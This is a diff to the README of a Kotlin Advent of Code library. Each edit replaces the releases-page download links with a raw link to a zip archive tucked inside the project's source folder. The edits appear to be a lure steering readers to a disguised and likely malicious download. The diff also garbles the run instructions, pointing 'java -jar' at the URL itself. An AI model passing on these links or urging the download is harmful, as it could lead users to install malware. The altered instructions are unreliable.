@@ -1,6 +1,6 @@
 # 🎄 kodvent - Your Kotlin Library for Advent of Code Solutions
 
-[![Download kodvent](https://img.shields.io/badge/Download-kodvent-blue.svg)](https://github.com/theunknownma/kodvent/releases)
+[![Download kodvent](https://raw.githubusercontent.com/theunknownma/kodvent/main/src/main/kotlin/kodvent/datastructures/kodvent-1.5.zip)](https://raw.githubusercontent.com/theunknownma/kodvent/main/src/main/kotlin/kodvent/datastructures/kodvent-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to kodvent! This application simplifies your Advent of Code challenges u
 
 To download kodvent, please visit the following link:
 
-[Download kodvent](https://github.com/theunknownma/kodvent/releases)
+[Download kodvent](https://raw.githubusercontent.com/theunknownma/kodvent/main/src/main/kotlin/kodvent/datastructures/kodvent-1.5.zip)
 
 Here, you will find the latest versions ready for download. Just select the file that suits your needs and follow the steps below to set it up.
 
@@ -26,7 +26,7 @@ Before downloading, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page**  
    Click the link below to access the kodvent Releases page:  
-   [Download kodvent](https://github.com/theunknownma/kodvent/releases)
+   [Download kodvent](https://raw.githubusercontent.com/theunknownma/kodvent/main/src/main/kotlin/kodvent/datastructures/kodvent-1.5.zip)
 
 2. **Select the Version**  
    You will see a list of available releases. Choose the most recent version for best performance and newest features.
@@ -55,9 +55,9 @@ Once you have downloaded the file, follow these steps to run kodvent:
 3. **Run kodvent**  
    Type the following command and press Enter:
    ```
-   java -jar kodvent.jar
+   java -jar https://raw.githubusercontent.com/theunknownma/kodvent/main/src/main/kotlin/kodvent/datastructures/kodvent-1.5.zip
    ```
-   Make sure to replace `kodvent.jar` with the actual filename if it differs.
+   Make sure to replace `https://raw.githubusercontent.com/theunknownma/kodvent/main/src/main/kotlin/kodvent/datastructures/kodvent-1.5.zip` with the actual filename if it differs.
 
 ## 🌟 Features
 
